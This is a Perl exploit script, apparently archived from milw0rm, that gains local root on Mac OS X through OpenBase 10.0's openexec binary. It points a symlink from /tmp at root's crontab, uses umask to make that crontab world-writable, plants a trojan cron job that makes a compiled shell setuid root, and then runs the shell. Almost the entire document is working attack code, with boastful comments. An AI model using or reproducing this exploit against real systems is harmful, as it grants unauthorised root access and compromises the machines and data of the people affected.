#!/usr/bin/perl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com)
#
# <= ftp://www.openbase.com/pub/OpenBase_10.0 (vulnerable) ?
#
# Create a new file anywhere on the filesystem with rw-rw-rw privs.
# Sorry you can NOT overwrite existing files.
#
# Writing to roots crontab seems to be fairly prompt at handing out root shells
# Make sure that you get cron running by first creating a user crontab!
#
# The openexec binary creates a root owned log file in /tmp/
# Following symlinks is bad mmmmmmmmmmkay!
#
# Tested against  OpenBase10.0.0_MacOSX.dmg

$dest = "/var/cron/tabs/root";

$binpath = "/Library/OpenBase/bin/openexec"; # Typical location.

# In this instance targets are really pointless but I wanted to archive known vulnerable versions while testing.
$tgts{"0"} = "OpenBase10.0.0_MacOSX.dmg:$binpath";

unless (($target) = @ARGV) {
       print "\n\nUsage: $0 <target> \n\nTargets:\n\n";

       foreach $key (sort(keys %tgts)) {
               ($a,$b) = split(/\:/,$tgts{"$key"});
               print "\t$key . $a\n";
       }

       print "\n";
       exit 1;
}

$ret = pack("l", ($retval));
($a,$b) = split(/\:/,$tgts{"$target"});
print "*** Target: $a $b\n";

open(OP,">/tmp/finisterre.c");
printf OP "main()\n";
printf OP "{ seteuid(0); setegid(0); setuid(0); setgid(0); system(\"/bin/sh -i\"); }\n";
system("gcc -o /Users/Shared/shX /tmp/finisterre.c");

# Create a user crontab FIRST! This ensures that cron is running when the fake root crontab is created. Aka semi-insta-root (in a minute)
system("echo '* * * * * /usr/bin/id > /tmp/aa' > /tmp/user_cron");
system("crontab /tmp/user_cron");

# The umask is where the lovin occurs. I'm rw-rw-rw James bitch!!
system("ln -s $dest /tmp/output");
sleep 60;   # Probably don't need to wait this long but whatever...

system("umask 111; $b -deactivate");
print "$dest should be rw-rw-rw ... enjoy!\n";
print "installing trojan crontab for root\n";

system("echo '* * * * * /usr/sbin/chown root: /Users/Shared/shX; /bin/chmod 4755 /Users/Shared/shX' > /var/cron/tabs/root");

print "sit around and chill for a minute then check /Users/Shared/shX !\n";
sleep 60 ;

system("/Users/Shared/shX");

# milw0rm.com [2006-11-08]
